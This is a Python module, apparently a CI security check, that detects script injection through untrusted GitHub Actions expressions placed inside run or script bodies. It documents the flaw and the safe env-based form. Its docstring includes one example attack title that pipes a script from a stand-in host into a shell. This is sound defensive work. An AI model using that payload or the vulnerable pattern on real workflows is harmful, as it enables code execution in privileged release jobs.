"""Find GitHub Actions expressions that reach a shell as code rather than as data.

`${{ }}` is not a shell variable. Actions substitutes it into the script body *before*
bash ever sees the text, so an expression holding attacker-controlled characters is
spliced into the command line and runs. `PR_TITLE="${{ github.event.pull_request.title }}"`
looks quoted and is not: a title of `"; curl evil.sh | sh; #` closes the quote and the
rest executes.

That exact line shipped in `publish-release.yml` to this repo and all seven generated
projects, in the job that holds `contents: write` and gates PyPI publication. OpenSSF
Scorecard flagged it as critical in eight repositories at once. Nothing in the test suite
looked at expression *placement*, only at pins and permissions, so the shape was free to
be copied forward on every release.

The safe form passes the value through `env:`, where the runner sets it as a real
environment variable and the shell reads it as data:

    env:
      PR_TITLE: ${{ github.event.pull_request.title }}
    run: |
      printf '%s' "$PR_TITLE" | grep -oP '...'

Text-based rather than YAML-based: the template's sources are `.jinja` files that a YAML
parser cannot load, and the same rule has to hold on both sides of the template boundary.
"""

import re

# Everything under `github.event` is written by whoever opened the pull request, issue,
# comment or discussion, and `github.head_ref` is a branch name on their own fork. There
# is no sub-field worth carving an exception for: `pull_request.number` is safe today,
# but an allowlist is a second thing to maintain and the `env:` form costs two lines.
UNTRUSTED = re.compile(r"\$\{\{\s*(?P<expr>github\.event[\w.*\[\]'\"-]*|github\.head_ref)\s*\}\}")

# `run:` and `script:` are the two keys whose value is executed. `script:` belongs to
# actions/github-script, where the value is JavaScript rather than shell, but the
# substitution happens the same way and a template literal breaks out the same way.
_SHELL_KEY = re.compile(r"^(?P<indent>\s*)(?:-\s+)?(?P<key>run|script):\s*(?P<inline>.*)$")


def _shell_lines(text):
    """Yield ``(line_number, line)`` for every line executed as a script body.

    Handles both the inline form (``run: echo hi``) and the block-scalar form
    (``run: |`` followed by an indented body), because the injection reads identically
    in either and a check that saw only one of them would pass over the other.
    """
    lines = text.splitlines()
    i = 0
    while i < len(lines):
        match = _SHELL_KEY.match(lines[i])
        if not match:
            i += 1
            continue

        inline = match.group("inline").strip()
        if inline and not inline.startswith(("|", ">")):
            yield i + 1, lines[i]
            i += 1
            continue

        # A block scalar runs until the indentation returns to the key's own level.
        key_indent = len(match.group("indent"))
        i += 1
        while i < len(lines):
            line = lines[i]
            if line.strip() and len(line) - len(line.lstrip()) <= key_indent:
                break
            yield i + 1, line
            i += 1


def sites_in_text(text, name="<text>"):
    """Untrusted expressions inside a script body, as ``(name, line, expression)``.

    An empty list is the passing result. Callers must separately assert that the set of
    files scanned is non-empty -- this returning nothing is equally consistent with "no
    injections" and "nothing was read".
    """
    return [
        (name, lineno, match.group("expr")) for lineno, line in _shell_lines(text) for match in UNTRUSTED.finditer(line)
    ]


def injection_sites(path):
    """``sites_in_text`` over one workflow file, keyed by its filename."""
    return sites_in_text(path.read_text(encoding="utf-8"), path.name)
